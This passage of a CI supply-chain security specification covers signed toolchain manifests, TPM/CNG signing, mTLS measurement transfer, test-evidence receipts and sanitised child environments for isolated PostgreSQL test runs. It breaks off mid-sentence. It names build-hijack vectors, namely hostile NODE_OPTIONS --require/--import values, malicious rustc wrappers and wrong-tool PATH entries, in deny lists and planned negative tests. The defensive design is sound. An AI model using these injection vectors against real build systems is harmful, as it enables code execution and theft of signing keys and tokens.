Provisioning profile 是宿主侧只读权威：Windows/Android execution lane 固定 `C:\ProgramData\EnterprisePlatform\ci\toolchains\<execution-lane>.v1.jcs`，Apple 固定 `/Library/Application Support/EnterprisePlatform/ci/toolchains/<execution-lane>.v1.jcs`。它的 strict fields 恰为 `schema_version=1,purpose="EP-F57-TOOLCHAIN-PROVISIONING-PROFILE-V1",execution_lane,runner_identity_subject,tools[],path_entries[],cargo_home_path,rustup_home_path,repository_cargo_config_path,node_runtime_policy_sha256,validity_seconds=28800`；tools/path nested identities与输出 manifest相同但不含 digest，repository config path 可 null。profile 文件与 parent 的 DACL/POSIX ACL 只允许受管 CI service identity/Administrators 写，拒绝 symlink、reparse、mount escape；profile raw digest进入测量证据。`xtask/src/toolchain_provision.rs` 按下述唯一 directory algorithm测量。CNG-capable runner随后用该 execution lane 的 `F57_TOOLCHAIN_ATTESTER` profile签名、自验、flush/readback并写固定 locator；普通 test/f57check只能 verify，不能隐式 attest 或刷新过期。

输出的 `F57ToolchainExecutionManifestV1` payload exact fields 为 `schema_version=1,purpose="EP-F57-TOOLCHAIN-EXECUTION-MANIFEST-V1",task_id,repository_tree_sha256,logical_lane,execution_lane,lane_profile_id,lane_profile_seed_sha256,lane_profile_row_sha256,provisioning_profile_sha256,measurement_evidence_sha256,tools[],path_entries[],cargo_home,rustup_home,repository_cargo_config,node_runtime_policy_sha256,issuer_role="F57_TOOLCHAIN_ATTESTER",ci_trust_bundle_sha256,issued_at,expires_at`。`expires_at-issued_at` 恰为 28,800 秒且不得越过签名链、CRL 或 policy有效期；一份 manifest 不得跨 task/profile/tree/execution lane 复用。`tools[].name` 是 byte-sorted unique closed enum `CARGO|RUSTC|RUSTDOC|MSVC_LINK|MSBUILD|DOTNET|WIX|SIGNTOOL|POWERSHELL|NODE|NPM|XCODEBUILD|SWIFT|CLANG|JAVA|JAVAC|GRADLE|ANDROID_SDKMANAGER|ANDROID_ADB|ANDROID_NDK_CLANG`，但每个 profile 只能列其 11-stage templates实际调用的 exact subset；少列、虚列或从未测量路径执行都失败。正式 Task 1 由 authority administrator用已批准 profile中的绝对 Cargo bootstrap path执行 exact attest/verify；该 ceremony 是 CI root-of-trust，不允许开发机 fixture生成正式输入。

Apple（以及未来任何无 Windows CNG 的注册 execution lane）使用 test-before-use measurement transfer，绝不“先测试、后补签”。Windows evidence authority 先经固定 mTLS 向已登记 runner 发出 single-use 256-bit challenge并在受保护 nonce store记录 `(nonce,task,tree,execution_lane,profile,expires_at<=now+600s)`。Native runner 的 `measure-native` 从固定 provisioning profile测量同一 tools/directories，建立 strict `F57NativeMeasurementTransferV1={schema_version:1,purpose:"EP-F57-NATIVE-MEASUREMENT-TRANSFER-V1",task_id,repository_tree_sha256,logical_lane,execution_lane,lane_profile_id,lane_profile_seed_sha256,lane_profile_row_sha256,provisioning_profile_sha256,measurement_payload,measurement_payload_sha256,challenge_nonce,runner_identity_subject,runner_attestation_profile:"CUSTOMER_MDM_HARDWARE_BOUND_MTLS_V1",runner_attestation_digest,measured_at,expires_at}`。`measurement_payload` exact fields 是 `tools[],path_entries[],cargo_home,rustup_home,repository_cargo_config,node_runtime_policy_sha256`；digest 为 `SHA-256("EP-F57-NATIVE-TOOLCHAIN-MEASUREMENT-V1\0" || JCS(measurement_payload))`。transfer 只通过 fixed customer-managed mTLS origin发送，origin/SPKI/client identity来自只读 policy而非 CLI/env；body最大 4 MiB，challenge只消费一次，`expires_at-measured_at<=600s`。

Windows receiver 验证 mTLS transcript、registered client SPKI、客户 MDM hardware-bound device attestation、challenge exact tuple/TTL/single-use、profile/task/tree/seed-row和全部 strict bytes；由服务端构造 `F57NativeMeasurementReceiptV1={transfer_payload_sha256,challenge_nonce,mtls_transcript_sha256,peer_spki_sha256,runner_attestation_digest,received_at}`，其 JCS digest成为 toolchain payload 的 `measurement_evidence_sha256`。Windows 只据此用该 execution lane 的 CNG `F57_TOOLCHAIN_ATTESTER` 签发 fixed-locator artifact并返回；transfer与receipt存于 `target/f57-ci-input/native-transfers/<task_id>/<execution_lane>/<lane_profile_id>.v1.json`及 authority append-only store，不进入 repository。Native runner用固定 CI root验 CMS/identity/expiry，重新测量本机 exact profile/tools/directories并 exact-equal signed payload后才启动第一个 stage；每 stage 前再查 expiry与目录 digest。response丢失只可领取同一 manifest bytes，不能重签不同时间；nonce replay、runner clone、错 tree/profile/lane、mTLS/MDM失效、TOCTOU或 Windows authority不可用均不运行。Apple native runner没有 CI CMS 私钥；Android 的注册 Windows evidence service 可持有受限 CNG key，但 Android build/test 进程本身不得持有或调用该 key。Task 1 KAT 覆盖 transfer tamper/replay/expiry/clone/TOCTOU 与“未先验证就启动进程”的负例。

CI trust bundle 固定只读路径为 `C:\ProgramData\EnterprisePlatform\trust\f57-ci-roots.p7b`，raw SHA-256 必须同时等于 policy 与适用 payload 的 `ci_trust_bundle_sha256`；其 exact degenerate SignedData certificates/full-CRL grammar沿用 F-56，但 CI root 与产品/客户 root 分域。每 execution-lane/role 非秘密 profile 唯一为 `C:\ProgramData\EnterprisePlatform\ci\signers\<execution-lane>.<issuer-role>.v1.jcs`，strict fields 恰为 `schema_version=1,purpose="EP-F57-CNG-SIGNER-PROFILE-V1",execution_lane,issuer_role,cng_provider_name,cng_key_name,key_version,leaf_certificate_der_b64url,intermediate_certificates_der_b64url[]`，DACL 只允 CI service identity/Administrators 读且拒绝 symlink/reparse。私钥固定为 Windows Platform Crypto Provider/TPM 中 non-exportable ECDSA P-256 key；`xtask/src/f57_signing.rs` 只在 runner 正常执行阶段以 `NCRYPT_SILENT_FLAG` 调 `NCryptOpenStorageProvider/NCryptOpenKey/NCryptSignHash`，不得在 service-start callback 内签名。CNG 返回值必须恰为 64-byte big-endian `r||s`；adapter 拒绝错长、r/s 为 0 或不小于 P-256 order，再编码为 CMS 要求的 DER `ECDSA-Sig-Value ::= SEQUENCE { r, s }`，不得把 raw 64 bytes 写入 signatureValue，也不得擅自新增 F-56 未规定的 low-S 判定。foundation 组装 CMS并用同一 verifier 自验；同目录 temporary file 写完后 flush file、flush containing directory、reopen/readback，再对已有目标使用 `ReplaceFileW`，对新目标使用 `MoveFileExW(MOVEFILE_REPLACE_EXISTING|MOVEFILE_WRITE_THROUGH)`，最后再次 reopen/readback，任何一步失败不暴露半成品。私钥绝不成为文件、argv、env、日志或 TestResult；缺 TPM/CNG/profile/DACL/trust/CRL 均失败关闭。Task 1 正式 POST_GREEN 只激活 seed 要求的 `windows-authority` execution lane；Apple 先完成上述 challenge/measurement/CNG-signed manifest/本机重测再启动，Android runner按其实际 Windows CNG profile直接 attest；两者都不取得私钥。

`crates/foundation/tests/fixtures/f56-cms-v1/` 是 verifier 实现前提交的 immutable independent golden set。`vectors.json` strict 记录每个 case id、expected outcome/error、payload exact JCS、signedAttrs universal-SET preimage、CMS/trust fixture ref 和全部 raw-byte digest；目录至少包含 ECDSA-P256/RSA-PSS 两个合法 artifact、active/revoked/stale-CRL/conflicting-highest-CRL 四个 bundle 以及 provenance README。README 固定独立生成器名称/版本、生成命令、每个 fixture SHA-256 和“无 production/customer private key”声明；生成器不链接本仓 verifier。duplicate/tag/time/algorithm 等反例可以从 immutable base bytes 定点变异，但每个 mutation 的 offset/preimage/expected stable error 必须先锁在 `vectors.json`，测试不得以实现输出反写期望。

`crates/foundation/tests/signature.rs` 必跑该 golden set 的 F-56 ECDSA-P256 与 RSA-PSS known-answer vectors、strict duplicate/unknown/missing JSON、outer/JCS/CMS/trust 三层大小边界、64-lowerhex、base64url padding、JCS/digest、CMS signedAttrs context `[0]` 转 universal SET 的 signature preimage、ASN-1 1949/1950/2049/2050 time、零/多链、missing/stale/conflicting global-highest CRL、revoked leaf/intermediate、wrong SPKI/purpose/trust digest。`xtask/tests/f57_evidence_signing.rs` 覆盖上述四个 Task 1 payload time mappings、policy/lane/role/status/validity、tamper/replay/tree mismatch、caller raw-key/path/subject/PASS/now 拒绝和 unsigned artifact 不落盘；Task 2 的 storage-manifest test 覆盖它自己的映射。Pure-Rust KAT private keys 只在 `cfg(test)` 内存生成并 zeroize；`windows_cng_signing.rs` 则使用专用、预置、non-exportable TPM test key 与 test-only purpose/root，绝不调用 production signer、从不导出/接触 private bytes，并证明真实 CNG 签名由同一 foundation verifier 验证、清空 PATH/无 openssl 仍 PASS、export key 失败、错 key/profile/DACL/CRL 全拒绝。

POST_GREEN 不接受调用方声称“测试已通过”。单任务形式由 `f57check` 从 immutable seed 选取 `activation_task == selected task` 的 exact rows；`--all` 不是生成一份 185-row 的伪 task manifest，而是在同一 final tree、同一 plan/seed/current signed generation 上按 F57-01…F57-25 依次执行相同单任务流程，并为每个 task 写独立 TestResult manifest 和 receipt。25 份 `bindings[]` 必须分别 exact-equal 该 task 的 activation 分区，合并后 exact-equal 全部 185 seed rows 且每个 RequirementID 恰出现一次；F57-03/04/05/07/10 是唯一五个合法空分区。F57-07 仍运行 Task 7 synthetic owner-green suite 与自己的 CI profile，只把四个 NFR stable bindings留给 Task 24 实机激活。它逐 TestID 运行且只允许三个 adapter。两个 Rust adapter 先分别运行 `cargo test --locked -p ep-testkit --test <name> -- --list` 或 `cargo test --locked -p ep-xtask -- --list`，只接受列表中按 `(^|::)<regex-escaped-test_symbol>$` 唯一匹配且类型为 `test` 的 canonical full harness name，再分别用 `cargo test --locked -p ep-testkit --test <name> -- <full-name> --exact --nocapture` 或 `cargo test --locked -p ep-xtask <full-name> -- --exact --nocapture` 执行；0/多匹配、只匹配 benchmark 或 doctest 都失败。Vitest adapter 固定运行 `npm --prefix clients/technology-gate/tauri2 test -- --run tests/gate.spec.ts -t ^<regex-escaped-test_symbol>$ --reporter=json`，解析 JSON 并要求恰一条 non-skipped test 的 full name 精确后缀匹配。当前 seed 恰为 184 个 Rust TestID 和 1 个 Vitest TestID；其他 path/extension/adapter、零匹配、多匹配、ignored/skipped/todo、非零退出或测试进程未实际启动全部失败。PowerShell、xcodebuild 与 Gradle 只生产下述平台 lane 证据，不能冒充某个 Requirement TestID。

Runner 从空环境构造 child env，绝不继承调用方提供的可执行路径或可执行配置。它只读前述 task/profile/execution-lane fixed locator，不接受环境变量、命令行或搜索路径覆盖；启动任何 stage/test/build 前先按 CI policy 验证 `SignedBusinessArtifactV1<F57ToolchainExecutionManifestV1>` 的完整 identity，signer 必须命中该 `execution_lane` 的 `F57_TOOLCHAIN_ATTESTER` authorization，并重测 provisioning profile与全部 bytes。`tools[]` 按 name byte-sort唯一，每项 exact 为 `{name,absolute_path,file_sha256}`且命中前述 closed enum/实际 template subset；`path_entries[]` 每项 exact 为 `{ordinal,absolute_path,directory_manifest_sha256}`，ordinal 从 0 连续且数组按 ordinal 排列，路径必须绝对、canonical、互不重复，无空项、`.`、相对路径或父目录穿越。`cargo_home`、`rustup_home` 都是 exact `{absolute_path,directory_manifest_sha256}`；`repository_cargo_config` 只取 null 或 `{path,sha256}`，path 只能恰为 repository root 下 `.cargo/config` 或 `.cargo/config.toml` 且两者不得并存。wrong task/tree/logical/execution lane/profile/seed-row、过期或 measurement evidence mismatch 一律在第一个子进程前失败。

所有 directory manifest 使用唯一算法：递归枚举该 root 内 regular file，拒绝 symlink、junction、reparse point、mount escape、socket/device 和不能稳定读取的项；relative path 转 UTF-8 NFC、分隔符 `/`、禁止 `.`/`..`，Windows 另拒绝 Unicode case-fold collision；按 relative path UTF-8 bytes 排序唯一，每项 exact 为 `{relative_path,size_bytes,file_sha256}`，其中 file digest 是原始 bytes 的 SHA-256 lowerhex。directory digest 恰为 `SHA-256("EP-F57-DIRECTORY-MANIFEST-V1\0" || JCS(entries))`；mtime、owner、ACL 不进入 digest，但 CI provisioning 必须另证 root 只读且 owner/ACL 合规。单文件 digest 同样是 raw bytes SHA-256 lowerhex。runner 逐文件/目录重算，使用 manifest 中的绝对工具路径，按 path entries 重建而非复制 `PATH`，并把已验签 toolchain payload digest 放入下述 execution context、lane `toolchain_digests[]` 与最终 receipt。缺工具、错 digest、过期、路径/目录内容漂移、错误 lane/issuer、可写 toolchain root 或未签 manifest 全部在启动测试前失败。

Child 只从宿主复制不可执行的 locale/terminal 开关 `LANG,LC_ALL,TERM,NO_COLOR,CI,RUST_BACKTRACE` 和 Windows 进程启动所需且经 lane manifest 绑定的 `SystemRoot,ComSpec,PATHEXT,PROGRAMDATA,ProgramFiles,ProgramFiles(x86)`；`TEMP/TMP/TMPDIR,HOME,USERPROFILE,HOMEDRIVE,HOMEPATH,APPDATA,LOCALAPPDATA,CARGO_TARGET_DIR,npm_config_cache` 全部由 runner 指向本次任务的隔离临时目录。`CARGO_HOME`、`RUSTUP_HOME` 由 manifest 的 `cargo_home`/`rustup_home` exact roots 设置并重算上段目录 manifest；repository 内 `.cargo/config` 或 `.cargo/config.toml` 只有 exact path/digest 等于 nullable `repository_cargo_config` object 时允许存在，为 null 时两者必须都不存在，其余祖先/用户 Cargo 配置均不可见。`NODE_OPTIONS,RUSTC_WRAPPER,RUSTC_WORKSPACE_WRAPPER,RUSTFLAGS,CARGO_ENCODED_RUSTFLAGS,CARGO_BUILD_RUSTC,CARGO_BUILD_RUSTC_WRAPPER`、HTTP(S) proxy、cloud token、signing key/trust path 和其他调用方 `EP_*` 一律删除；runner 只写入非秘密 `EP_F57_EVIDENCE_ROOT,EP_F57_TEST_RUN_ID,EP_F57_REPOSITORY_TREE_SHA256,EP_F57_GENERATION`。下述 23 个 database-context task 额外获得 child-only `EP__DB__URL=<fresh-url>` 与 `EP_TEST_DATABASE_URL=<same-fresh-url>`；只有 ep-migrate 子进程再获得 `EP__DB__MIGRATION__EXPECTED_VERSIONS_PATH`。非数据库 task 这三个变量全部缺失，任何连接 retained/shared database 的企图失败。Task 1 negatives 必须注入 hostile `NODE_OPTIONS=--require/--import`、恶意 rustc wrapper、wrong-tool PATH、篡改 Cargo config/home 和伪 admin/DB/proxy/secret variables，逐项证明它们既未执行也未出现在 child env；正例同时证明 Rust 与 Vitest 能从隔离工具链完成运行。

成功后先原子写 `target/f57-ci-evidence/test-results/F57-NN/post-green.v1.json`，再计算 `test_result_manifest_sha256`，最后才允许签任务回执。其 `F57TestResultManifestPayloadV1` exact fields 为 `schema_version=1`、`purpose="EP-F57-TEST-RESULT-MANIFEST-V1"`、`task_id`、`repository_tree_sha256`、`plan_sha256`、`ownership_seed_sha256`、`runner_binary_sha256`、`execution_context_sha256`、`started_at_utc`、`finished_at_utc` 和 `bindings[]`；bindings 按 RequirementID 排序并与该 task 的 activation 分区 exact-equal。当前 seed 中 `F57-03,F57-04,F57-05,F57-07,F57-10` 的 activation rows 恰为 0，因此这五个 task 的 `bindings=[]` 是唯一合法零行形态，但仍必须通过各自 Task green suite、25-row CI lane profile、due-target manifest 和适用的 FreshPg profile；F57-07 的 NFR bindings只在 F57-24 实机分区出现。其他 task 空 bindings、选中行非空却缺 binding 或任何零/多匹配均失败。每个 binding 使用 `RequirementEvidenceBindingV1` exact fields：`requirement_id,owner_task,activation_task,test_id,test_target_path,test_symbol,run_id,result,output_digest,evidence_id,evidence_schema,platform_lane,generation`；`run_id` 是 UUIDv7，`result` 只允许 `PASS`，`generation=0` 仅允许 Task 9 之前的中间回执；Task 25 的 `--all` final-tree 重跑要求 25 份 manifests 中全部非空 bindings 都使用同一个当前正 generation，并通过 185-row exact partition check。`output_digest` 是 `SHA-256("EP-F57-TEST-RESULT-V1\0" || JCS({run_id,adapter,canonical_argv_sha256,runner_binary_sha256,execution_context_sha256,exit_code,stdout_sha256,stderr_sha256,started_at_utc,finished_at_utc}))`；stdout/stderr 只做有界流式摘要，不写入清单。失败、非法空结果、预存结果复用、路径/符号漂移或中途终止删除临时清单并且不签回执。该未单独签名的 strict payload 只在同一进程生成，并由任务回执的 digest、tree/plan/seed/checker digest 和 detached CMS 共同保护。

`docs/f57-ci-stage-registry.seed.tsv` 与 `docs/f57-ci-lane-task-profiles.seed.tsv` 是唯一 CI stage/profile 机器权威。前者 exact 11 rows，header 为 `stage_set_id\tstage_order\tstage_id\tcommand_contract_id\tordered_argv_template_json\tinput_selector\tresult_schema`；stage_set 恰为 `F57_STAGE_REGISTRY_V1`，order 1..11 连续，stage/contract/selector/result 逐行等于 seed。模板只允许 `{task_id}|{execution_lane}|{lane_profile_id}` 三个完整 argv element placeholder，替换后 logical argv 必须恰为 `cargo xtask ci-stage --task <F57-NN> --lane <execution-lane> --profile <profile-id> --stage <stage-id>`；runner 只把 argv[0] 替成已测量绝对 Cargo path，canonical digest仍对 logical array计算。每个 `command_contract_id` 精确消费同 row `input_selector` 指定的 signed/due carrier：toolchain/offline locks、due builds、current-tree arch rules、task migration ceiling、current-tree code rules、registry snapshot+due API shapes、due SBOM/secret scan、profile-required reproducible artifacts、due TestID selection+lane-local bounded test/coverage output、profile-required typed E2E、platform security/resource readback。Stage 9 不读取、引用或生成 `F57TestResultManifestPayloadV1`；该 manifest 只在 lane artifact完成后由下游 TestResultRunner 生成，避免 evidence cycle。不得从 prose 拼 argv、换 command、运行空选择器或返回 NOT_DUE。

profile seed exact 25 rows、按 F57-01..F57-25 排序且每 task 一行；header 为 `task_id\tlogical_lane\tlane_profile_id\tprofile_mode\texecution_lanes_json\tartifact_ids_json\tstage_set_id`。`execution_lanes_json` 与 `artifact_ids_json` 均 strict JSON ordered nonempty arrays and exact-equal the row；unknown task/lane/profile/mode/artifact、duplicate/missing row or array reorder fails. `BOOTSTRAP_DUE` (F57-01) 的 11 个非空 stage 只证明 Task 1 foundation/checker/registry/signing/bootstrap Windows controls，并且只能产 `F57-LANE-WINDOWS-BOOTSTRAP-V1`；它绝不冒充 MSI/SCM/P340/恢复已完成。`INCREMENTAL_DUE` 运行截至该 task 的 due set；即使 activation bindings 为空，build/test/E2E/deploy stage 仍运行该 task 计划中的 owner-green/FreshPG/platform checks。`FOUR_PLATFORM_DUE` 分别在 Windows、Apple、Android、evidence-aggregate 执行同一 task/profile 的 11 个非空 stage；Apple/Android 的 sqlcheck/registry stage 执行静态 exact manifest，deploy-limits 分别执行客户端 sandbox/signing/permission readback，不能以 NOT_DUE 通过。`FULL_WINDOWS_PRODUCTION` 仅 F57-24，11 stages 必须包含真实 MSI/SCM/ACL/Job Object/PostgreSQL/P340/UPS/backup/restore；`FULL_RELEASE_AGGREGATE` 仅 F57-25，重新验证所有 prior task/profile artifacts 与 final tree。唯一 orchestration CLI 是 `cargo xtask ci --lane <execution-lane> --task F57-NN --profile <lane_profile_id>`；task/profile/lane triple 必须来自 seed。`ci-stage` 仅由该 orchestrator在清洁环境调用，用户直接调用不能签 lane artifact。

每个 stage 先原子写 strict JCS `F57LaneStageResultV1` 到 `target/f57-ci-evidence/lane-stages/<task_id>/<execution_lane>/<stage_order>-<stage_id>.v1.json`。exact fields 为 `schema_version=1,purpose="EP-F57-LANE-STAGE-RESULT-V1",task_id,logical_lane,execution_lane,lane_profile_id,profile_mode,stage_set_id,lane_profile_seed_sha256,lane_profile_row_sha256,stage_registry_seed_sha256,stage_registry_row_sha256,stage_order,stage_id,repository_tree_sha256,due_target_manifest_sha256,toolchain_manifest_payload_sha256,command_contract_id,ordered_argv_sha256,runner_binary_sha256,lane_execution_context_sha256,started_at_utc,finished_at_utc,exit_code,stdout_sha256,stderr_sha256,outcome="PASS"`。`lane_profile_row_sha256=SHA-256("EP-F57-CI-LANE-PROFILE-ROW-V1\0" || JCS(strict parsed profile row))`；stage row同理使用 domain `EP-F57-CI-STAGE-ROW-V1`；stage result digest 恰为 `SHA-256("EP-F57-LANE-STAGE-RESULT-V1\0" || JCS(payload))`。PASS 必须 exit_code=0、实际进程已启动、bounded stdout/stderr 已完成摘要；空命令、skip/NOT_DUE、错 selector/argv、另一 task/profile/tree/due manifest/toolchain/context/result复用均失败并删除临时文件。schema 唯一为 `docs/evidence/f57-lane-stage-result.schema.json`。

每个 POST_GREEN `platform_lane_evidence_refs[]` 项 exact fields 为 `{logical_lane,execution_lane,lane_profile_id,artifact_id,path,payload_sha256,signer_subject}`，其 exact artifact set 来自所选 profile row，不再从逻辑 lane 名推断一个固定 full artifact。Profile seed 中 `execution_lanes_json[i]` 与 `artifact_ids_json[i]` 按同一索引一一映射，长度必须相等；数组顺序就是证据顺序，不能分别排序后再配对。路径固定为 `target/f57-ci-evidence/lanes/<task_id>/<artifact_id>.v1.json`，外层必须是已验证 `SignedBusinessArtifactV1<F57LaneEvidencePayloadV1>`。四端 profile 的 matrix artifact exact-ref 同 task/tree/profile 的 Windows x64、macOS universal、iOS arm64、Android arm64 包/启动/contract结果。F57-25 offline profile 的 `referenced_artifacts[]` 不得选择“最近”：它按此固定顺序 exact-ref同 final tree 的 `F57-24/WINDOWS_PRODUCTION_FULL_F57_24_V1/F57-LANE-WINDOWS-AUTHORITY-V1`，再 exact-ref `F57-22/FOUR_PLATFORM_DUE_F57_22_V1` 的 `F57-CLIENT-WINDOWS-X64-V1`、`F57-LANE-APPLE-MACOS-IOS-V1`、`F57-LANE-ANDROID-CLIENT-V1`、`F57-CLIENT-FOUR-TARGET-MATRIX-V1`；路径均按上式，且不引用 task receipt/TestResult。`F57LaneEvidencePayloadV1` exact fields 为 `schema_version=1,purpose="EP-F57-LANE-EVIDENCE-V1",task_id,logical_lane,execution_lane,lane_profile_id,profile_mode,stage_set_id,lane_profile_seed_sha256,lane_profile_row_sha256,stage_registry_seed_sha256,due_target_manifest_sha256,lane_execution_context_sha256,artifact_id,repository_tree_sha256,ci_trust_bundle_sha256,platform_targets[],toolchain_digests[],lane_stage_result_digests[11],referenced_artifacts[],started_at_utc,finished_at_utc,outcome="PASS"`；11 stage digests按 stage_order，逐个重新加载 schema/digest/identity，无缺失/额外。Task receipt 独立绑定 profile seed digests、lane refs 与 TestResult；TaskGateManifest/Task25 再汇总 25 receipts/185 TestIDs，因此无 lane↔task evidence cycle。

Database-context task exact-set is `F57-01..F57-14, F57-16, F57-18..F57-25`。For those 23 tasks only, POST_GREEN must run `FreshPg16TaskGate::with_database(task, admin_url, |context| TestResultRunner + FreshPgTaskProfile)` before a receipt can be written；this includes Tasks 19–22 because their owner/repository/closure TestIDs require a real authority database even though they add no migration. PRE_RED and Tasks 15/17 receipts fix `fresh_pg16_evidence_sha256` to null. The helper obtains `EP_TEST_PG16_ADMIN_URL`，creates a cryptographically random uniquely named empty database, applies exactly the retained existing migrations plus the three corrected Task 1 drafts and F-57 reservations whose owner task is `<= selected task`, then runs both that task's selected TestIDs and registered `pg_catalog`/constraint/RLS/repository negatives inside the same database lifetime. It records server major=16, applied version/path list and result digests, drops only that named database, and only then returns evidence. Missing URL/server、wrong major、create/drop denial、an absent/extra/lower-late migration、ignored test or retained database reuse is failure and produces no POST_GREEN receipt. `--all --phase post-green` repeats the isolated database proof for all 23 checkpoints on the same final tree；a signed cache may be reused only for an identical task ID + tree + migration-manifest + PostgreSQL build digest + TestID manifest digest, never merely by filename.

Task 1 pins one workspace dependency family for the shared verifier: `base64=0.22`、`cms=0.2.3` (`default-features=false,features=["std"]`)、`const-oid=0.9`、`der=0.7` (`alloc,derive,oid,std`)、`rsa=0.9` (`default-features=false,features=["std","sha2","u64_digit"]`)、`serde_json_canonicalizer=0.3.2`、`signature=2.2`、`spki=0.7` (`std`)、`x509-cert=0.2.5` (`default-features=false,features=["std"]`) and `zeroize=1`；existing `p256` expands only to `ecdsa,pkcs8,std` and `sha2` adds `oid`. `ep-foundation` directly declares the CMS/JCS/crypto/cert/error dependencies it uses；`ep-xtask` directly declares `ep-foundation,chrono,toml,zeroize,tokio,tokio-postgres,uuid,sha2`, and its Windows target alone declares `windows-sys=0.61` features `Win32_Foundation,Win32_Security_Cryptography,Win32_Storage_FileSystem`. `ep-foundation` 的 F-56/F-57 signature implementation 及其 resolved `cms/x509/der/spki/rsa/signature` subtree 只能使用上述 0.7-family；现有无关依赖的其他版本不得被当作替代 parser/verifier，Task 1 不为消除无关 lockfile 重复而升级整个生态。禁止把 der-0.8/x509-cert-0.3 family 混入该签名 subtree，且任何 F-57 path 都不得依赖 system OpenSSL。

`FreshPg16TaskGate` does not interpret or execute SQL itself. It derives an exact staging manifest from the catalog's 66 `EXISTING` physical rows, the three named corrected Task 1 drafts and the selected F-57 reservation prefix, rejects every source-byte/path/status mismatch, copies those exact bytes into a task/tree-digest-scoped staging migration root, writes a generated one-key TOML `expected_version = <selected maximum version>`, and computes the existing `ep-migrate` manifest digest. Before constructing the child environment, the helper resolves `cargo` to an absolute executable from the already validated toolchain allowlist and binds that executable digest into runner evidence. It then launches exactly `<resolved-cargo> run --locked --quiet -p ep-migrate -- apply --migrations-dir=<staging-root> --expect-manifest-sha256=<computed-lowerhex>` with the same closed, non-secret OS/tool allowlist defined for `TestResultRunner`; it explicitly removes `EP_TEST_PG16_ADMIN_URL`、every pre-existing `EP__DB__*` and `EP_TEST_DATABASE_URL`、all other `EP_*`、proxy variables、cloud credentials、signing material and trust paths, then injects exactly two database-specific variables: `EP__DB__URL=<fresh-database-url>` and `EP__DB__MIGRATION__EXPECTED_VERSIONS_PATH=<generated-toml>`. No administrator URL or credential may enter argv、logs、receipts or digests. `xtask` environment-capture negatives must prove the migration child can resolve Cargo/Rust/linker/temp facilities from the closed allowlist while `EP_TEST_PG16_ADMIN_URL`、unrelated `EP__DB__*`、proxy/cloud/signing/trust variables and inherited secrets are absent. The existing migration binary remains the only migration executor and must report exactly the staged versions in `platform_core.schema_history`; the gate rejects a missing/extra/out-of-order history row or checksum mismatch.

`EP_TEST_PG16_ADMIN_URL` must be a `postgresql://` URL whose path is exactly `/postgres`, whose credentials are percent-encoded, and which has no fragment；only an optional query string may follow. The helper rejects every other form, replaces only that exact final path segment when deriving the child-only fresh URL, and never renders either URL in an error. The database name is exactly `ep_f57_<two-digit-task>_<32-lowerhex-uuidv7>` and is validated as a lower-case unquoted PostgreSQL identifier before `CREATE DATABASE`; cleanup reconnects only to the supplied `postgres` admin database and issues `DROP DATABASE <that-exact-generated-name> WITH (FORCE)`.

`docs/f57-fresh-pg-task-profiles.seed.tsv` is the sole closed `FreshPgTaskProfile` authority. It is UTF-8/no BOM/LF-only, with exact header `task_id\tprofile_version\ttest_target\ttest_symbol\tordered_argv_json\tsupplemental_contract` and exactly 23 rows in task order `F57-01..F57-14,F57-16,F57-18..F57-25`. `profile_version` is exactly `1`；target is exactly `xtask/tests/fresh_pg16_profiles.rs`；symbols are exactly `fresh_pg_profile_f57_NN`；`ordered_argv_json` strict-parses to the literal array `["cargo","test","--locked","-p","ep-xtask","--test","fresh_pg16_profiles",<same-symbol>,"--","--exact","--nocapture"]`；supplemental contract is exactly `MIGRATION_CEILING_PLUS_PG_CATALOG_CONSTRAINT_RLS_REPOSITORY_NEGATIVES`. `xtask/tests/fresh_pg16_profiles.rs` defines those 23 non-ignored test symbols without wildcard dispatch；each symbol hard-binds its task, verifies the due migration manifest and every registered table/index/check/FK/trigger/RLS/FORCE-RLS/repository negative owned at or before that task, and cannot invoke `f57check` or another Cargo process. The runner uses the seed argv only after replacing argv[0] with the measured absolute Cargo tool path while preserving the canonical argv digest over the logical array. Seed-bound Requirement TestIDs run exactly once through `TestResultRunner` in the same database lifetime and are not repeated by this supplemental harness. Task 1 and every POST_GREEN exact-cross-check task `Files` migration entries、reservation owner ceiling、profile symbol/argv and catalog expectations；missing/extra/reordered row、free-form command、recursive gate、duplicate TestID or prose-derived command fails. The exact seed raw digest enters every receipt and cache key.

Execution context is two-level so a four-platform task never pretends four toolchains are one. Before any stage starts, each execution lane atomically writes `F57LaneExecutionContextPayloadV1` at `target/f57-ci-evidence/execution-contexts/<task_id>/<execution_lane>.lane.v1.json` with exact fields `schema_version=1,purpose="EP-F57-LANE-EXECUTION-CONTEXT-V1",task_id,repository_tree_sha256,logical_lane,execution_lane,lane_profile_id,lane_profile_seed_sha256,lane_profile_row_sha256,toolchain_manifest_payload_sha256,child_environment_policy_sha256,process_contexts[]`。It precomputes the exact 11 stage child argv/environment contexts, is immutable during the lane, and its digest is `SHA-256("EP-F57-LANE-EXECUTION-CONTEXT-V1\0" || JCS(payload))`；each stage result and lane evidence binds that digest. After all profile artifacts verify and before TestResult execution, the authority/aggregate runner writes the task-level `F57ExecutionContextPayloadV1` at `target/f57-ci-evidence/execution-contexts/<task_id>/task.v1.json` with exact fields `schema_version=1,purpose="EP-F57-EXECUTION-CONTEXT-V1",task_id,repository_tree_sha256,logical_lane,lane_profile_id,lane_profile_seed_sha256,lane_profile_row_sha256,lane_context_refs[],task_runner_toolchain_manifest_payload_sha256,child_environment_policy_sha256,process_contexts[],database_context`。`lane_context_refs[]` is exact profile execution-lane order and each item is `{execution_lane,path,payload_sha256,toolchain_manifest_payload_sha256}`；it must exact-match every lane artifact/context and cannot collapse different Apple/Android/Windows toolchains. The task-level context digest is what TestResult/FreshPG/receipt bind.

In both payloads, `process_contexts[]` is sorted uniquely by `(process_role,canonical_argv_sha256)` and each item is exact `{process_role,canonical_argv_sha256,normalized_environment_sha256}`；roles are the closed adapters/child roles registered by Task 1. `normalized_environment_sha256` hashes the actual child name/value map after validation with only these deterministic substitutions: the exact generated fresh URLs become `<FRESH_DATABASE_URL>`、the exact task temp root becomes `<TASK_TEMP_ROOT>`、the exact staging root becomes `<STAGING_ROOT>`；no other value is redacted or normalized, and any unregistered secret-like name fails before hashing. `child_environment_policy_sha256` is the SHA-256/JCS digest of strict `F57ChildEnvironmentPolicyV1={schema_version:1,purpose:"EP-F57-CHILD-ENVIRONMENT-POLICY-V1",allowed_inherited_names[],runner_synthesized_names[],conditional_names_by_process_role{},forbidden_exact_names[],forbidden_prefixes[]}` generated from the closed rules above；arrays/keys are sorted unique, deny-inheritance is evaluated before runner injection, and unknown name/prefix is deny. The one `docs/evidence/f57-execution-context.schema.json` has strict `$defs` for both payloads and refs；unknown/missing/duplicate lane 